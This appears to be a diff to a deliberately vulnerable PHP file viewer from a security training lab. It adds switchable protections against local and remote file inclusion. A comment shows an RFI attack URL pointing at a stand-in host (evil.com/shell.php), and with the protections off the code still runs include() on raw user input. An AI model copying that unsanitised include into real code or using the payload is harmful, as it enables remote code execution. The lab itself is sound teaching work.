@@ -10,6 +10,10 @@ session_start();
 // 공격 예시: /file_viewer.php?file=http://evil.com/shell.php
 
 $is_logged_in = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
+
+// 보안 설정 확인
+$lfi_protection = isset($_SESSION['security_settings']['lfi_protection']) ? $_SESSION['security_settings']['lfi_protection'] : false;
+$rfi_protection = isset($_SESSION['security_settings']['rfi_protection']) ? $_SESSION['security_settings']['rfi_protection'] : false;
 ?>
 <!DOCTYPE html>
 <html>
@@ -170,10 +174,23 @@ $is_logged_in = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
         <div class="nav-buttons">
             <a href="index.php" class="btn btn-secondary">🏠 메인으로</a>
             <a href="upload.php" class="btn btn-primary">📤 파일 업로드</a>
+            <a href="security.php" class="btn btn-secondary">🔒 보안 설정</a>
         </div>
         
         <div class="header">
             <h2>📁 파일 뷰어</h2>
+            <?php if ($is_logged_in): ?>
+            <div style="text-align: right; margin-top: 10px;">
+                <span style="font-size: 14px; color: #666;">LFI 보안: </span>
+                <span style="font-size: 14px; font-weight: bold; color: <?php echo $lfi_protection ? '#28a745' : '#dc3545'; ?>;">
+                    <?php echo $lfi_protection ? '🛡️ ON' : '⚠️ OFF'; ?>
+                </span>
+                <span style="margin-left: 15px; font-size: 14px; color: #666;">RFI 보안: </span>
+                <span style="font-size: 14px; font-weight: bold; color: <?php echo $rfi_protection ? '#28a745' : '#dc3545'; ?>;">
+                    <?php echo $rfi_protection ? '🛡️ ON' : '⚠️ OFF'; ?>
+                </span>
+            </div>
+            <?php endif; ?>
         </div>
 
         <?php if (!$is_logged_in): ?>
@@ -207,10 +224,18 @@ $is_logged_in = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
 if (isset($_GET['file'])) {
     $file_path = $_GET['file'];
 
-    // 디렉토리 트레버셜 대책 (현재 비활성화됨)
-    // if (strpos($file_path, '..') !== false) {
-    //     die('Directory traversal attempt detected.');
-    // }
+    // RFI 대책 (보안 설정에 따라 토글)
+    if ($rfi_protection && preg_match('/^(https?|ftp):\/\//i', $file_path)) {
+        echo '<div class="file-content">';
+        echo '<div class="error-message">🚫 보안 경고: 원격 파일 포함(RFI) 시도가 감지되어 차단되었습니다.</div>';
+        echo '</div>';
+    }
+    // 디렉토리 트레버셜 대책 (보안 설정에 따라 토글)
+    elseif ($lfi_protection && strpos($file_path, '..') !== false) {
+        echo '<div class="file-content">';
+        echo '<div class="error-message">🚫 보안 경고: 디렉토리 트레버셜 시도가 감지되어 차단되었습니다.</div>';
+        echo '</div>';
+    } else {
 
     $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
     $allowed_image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
@@ -232,6 +257,7 @@ if (isset($_GET['file'])) {
         include($file_path);
     }
     echo '</div>';
+    }
 }
 ?>
 
